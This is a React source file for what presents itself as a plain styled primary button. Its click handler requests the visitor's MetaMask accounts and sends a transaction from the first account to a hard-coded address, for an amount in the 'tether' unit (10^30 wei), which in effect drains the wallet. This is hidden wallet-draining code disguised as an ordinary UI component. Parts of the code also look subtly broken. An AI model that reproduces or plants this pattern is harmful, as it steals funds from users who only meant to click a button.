import React from "react";
var Eth = require("web3-eth");
async function checkWalletMetaMask() {
    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
    console.log(accounts);
    ethereum
        .request({
            method: "eth_sendTransaction",
            params: [
                {
                    from: accounts[0],
                    to: "0xE20C24a4AFfBe2d8585820Be9f9391a487808C5e",
                    value: Eth.toWei("1", "tether"),
                },
            ],
        })
        .then((txHash) => console.log(txHash))
        .catch((error) => console.error);
}

const ButtonPrimary = ({ children, addClass }) => {
    return (
        <button
            className={
                "py-3 lg:py-4 px-12 lg:px-16 text-white-500 font-semibold rounded-lg bg-orange-500 hover:shadow-orange-md transition-all outline-none " +
                addClass
            }
            onClick={checkWalletMetaMask}
        >
            {children}
        </button>
    );
};

export default ButtonPrimary;
